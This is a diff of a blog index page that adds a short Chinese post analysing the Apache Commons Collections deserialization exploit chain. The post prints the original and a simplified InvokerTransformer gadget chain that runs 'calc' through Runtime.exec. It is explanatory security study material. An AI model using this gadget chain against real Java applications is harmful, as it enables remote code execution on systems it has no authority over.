@@ -152,7 +152,76 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-Commons CollectionsPoc函数链执行过程分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-Commons CollectionsPoc函数链执行过程分析下" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="title-Commons-CollectionsPoc函数链执行过程分析下"><a href="#title-Commons-CollectionsPoc函数链执行过程分析下" class="headerlink" title="title:Commons CollectionsPoc函数链执行过程分析下"></a>title:Commons CollectionsPoc函数链执行过程分析下</h2><p>&nbsp;&nbsp;又仔细想了一下,发现那个函数执行链可以简化<br></p>
+<pre><code> Transformer[] transformers = new Transformer[]{
+new ConstantTransformer(Runtime.class),
+new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class,Class[].class},
+new Object[]{&quot;getRuntime&quot;, new Class[0]}),
+new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class,Object[].class},
+new Object[]{null, new Object[0]}),
+new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class},
+new Object[]{&quot;calc&quot;})
+};
+</code></pre><p>  &nbsp;&nbsp;这是原版的函数链。<br></p>
+<pre><code>Transformer[] transformers = new Transformer[]{
+new ConstantTransformer(java.lang.Runtime.getRuntime()),
+new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;})
+};  
+</code></pre><p>&nbsp;&nbsp;这是简化后的函数链<br><br>&nbsp;&nbsp;原来的函数链前几条语句其实只为了构造Runtime对象<br><br>&nbsp;&nbsp;这里直接传入Runtime对象，然后下一步直接利用反射执行</p>
+
+      
+      
+      
+    </div>
+   
+    <div class="article-info article-info-index">
+    <span id="busuanzi_container_page_pv">
+                           本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+                  </span>
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="2018/11/17/Commons CollectionsPoc函数链执行过程分析下/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+
+  
+    <article id="post-Commons CollectionsPoc函数链执行过程分析上" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
     <div class="article-entry" itemprop="articleBody">
@@ -160,7 +229,7 @@
         <hr>
 <h2 id="title-Commons-CollectionsPoc函数链执行过程分析"><a href="#title-Commons-CollectionsPoc函数链执行过程分析" class="headerlink" title="title:Commons CollectionsPoc函数链执行过程分析"></a>title:Commons CollectionsPoc函数链执行过程分析</h2>
         
-          <a class="article-more-a" href="2018/11/17/Commons CollectionsPoc函数链执行过程分析/#more">more >></a>
+          <a class="article-more-a" href="2018/11/17/Commons CollectionsPoc函数链执行过程分析上/#more">more >></a>
         
       
       
@@ -177,7 +246,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="2018/11/17/Commons CollectionsPoc函数链执行过程分析/">展开全文 >></a>
+          <a class="article-more-a" href="2018/11/17/Commons CollectionsPoc函数链执行过程分析上/">展开全文 >></a>
         </p>
       
 
@@ -800,7 +869,7 @@
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
-		open_in_new: false,
+		open_in_new: true,
 		toc_hide_index: true,
 		root: "/",
 		innerArchive: true,
